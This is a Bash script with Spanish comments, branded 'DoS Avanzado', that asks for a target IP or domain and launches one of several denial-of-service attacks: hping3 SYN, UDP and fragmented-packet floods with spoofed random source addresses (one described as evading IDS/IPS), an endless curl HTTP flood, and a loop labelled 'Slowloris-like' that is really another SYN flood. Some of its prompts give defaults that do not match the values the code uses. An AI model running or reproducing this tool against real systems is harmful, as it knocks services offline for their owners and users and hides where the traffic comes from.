#!/bin/bash

# ████████████████████████████████████████
#    H4ck_Gu4rdian mx - DoS Avanzado
# ████████████████████████████████████████

# ───────────────[ Colores ]───────────────
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
RESET='\033[0m'

# ───────────────[ Función Banner ]───────────────
banner() {
    echo -e "${CYAN}"
    echo "██████╗  ██████╗ ███████╗    ██████╗  ██████╗ ███████╗"
    echo "██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔═══██╗██╔════╝"
    echo "██║  ██║██║   ██║███████╗    ██████╔╝██║   ██║█████╗  "
    echo "██║  ██║██║   ██║╚════██║    ██╔═══╝ ██║   ██║██╔══╝  "
    echo "██████╔╝╚██████╔╝███████║    ██║     ╚██████╔╝███████╗"
    echo "╚═════╝  ╚═════╝ ╚══════╝    ╚═╝      ╚═════╝ ╚══════╝"
    echo "               DoS Avanzado"
    echo -e "${RESET}"
}

# ───────────────[ Variables globales ]───────────────
LOG_FILE="dos_$(date +%Y%m%d_%H%M%S).log"
UA_LIST=("Mozilla/5.0" "Chrome/90.0" "Safari/537.36" "Edge/18.18363")
TARGET=""
MODE=""
PORT=80
THREADS=4000
DURATION=1000

# ───────────────[ Funciones de ataque ]───────────────

# SYN Flooding
syn_flood() {
    echo -e "${RED}[+] Iniciando SYN Flood a $TARGET en el puerto $PORT${RESET}" | tee -a "$LOG_FILE"
    hping3 -S $TARGET -p $PORT --flood --rand-source | tee -a "$LOG_FILE"
}

# HTTP GET/POST Flood
http_flood() {
    echo -e "${RED}[+] Iniciando HTTP Flood a $TARGET en el puerto $PORT${RESET}" | tee -a "$LOG_FILE"
    for ((i=0; i<THREADS; i++)); do
        while true; do
            curl -s -X GET "http://$TARGET" -H "User-Agent: ${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}" &
        done
    done
}

# Slowloris-like (mantener conexiones abiertas)
slowloris() {
    echo -e "${RED}[+] Iniciando ataque Slowloris a $TARGET en el puerto $PORT${RESET}" | tee -a "$LOG_FILE"
    while true; do
        hping3 -c 1 $TARGET -p $PORT --rand-source -d 10000 -S &
    done
}

# Paquetes fragmentados (bypass IDS/IPS)
fragmented_attack() {
    echo -e "${RED}[+] Enviando paquetes fragmentados a $TARGET en el puerto $PORT${RESET}" | tee -a "$LOG_FILE"
    hping3 $TARGET -f -p $PORT --rand-source -d 120 | tee -a "$LOG_FILE"
}

# UDP Flood
udp_flood() {
    echo -e "${RED}[+] Iniciando UDP Flood a $TARGET en el puerto $PORT${RESET}" | tee -a "$LOG_FILE"
    hping3 --udp -p $PORT --flood --rand-source $TARGET | tee -a "$LOG_FILE"
}

# ───────────────[ Menú principal ]───────────────
menu() {
    echo -e "${BLUE}[1] SYN Flood"
    echo -e "[2] HTTP Flood (GET/POST)"
    echo -e "[3] Slowloris-like Attack"
    echo -e "[4] Paquetes Fragmentados"
    echo -e "[5] UDP Flood${RESET}"
    echo ""
    read -p "Seleccione el tipo de ataque (1-5): " MODE
}

# ───────────────[ Configuración de ataque ]───────────────
setup() {
    echo -e "${YELLOW}[+] Configuración del ataque${RESET}"
    read -p "Ingrese la IP o dominio objetivo: " TARGET
    read -p "Ingrese el puerto (default: 80): " PORT
    PORT=${PORT:-80}
    read -p "Número de hilos (default: 100): " THREADS
    THREADS=${THREADS:-4000}
    read -p "Duración en segundos (default: 60): " DURATION
    DURATION=${DURATION:-1000}
}

# ───────────────[ Ejecutar ataque ]───────────────
ejecutar() {
    case $MODE in
        1) syn_flood ;;
        2) http_flood ;;
        3) slowloris ;;
        4) fragmented_attack ;;
        5) udp_flood ;;
        *) echo -e "${RED}Opción inválida${RESET}" ;;
    esac
}

# ───────────────[ Iniciar herramienta ]───────────────
clear
banner
setup
menu
ejecutar
echo -e "${GREEN}[+] Ataque completado. Log guardado en $LOG_FILE${RESET}"
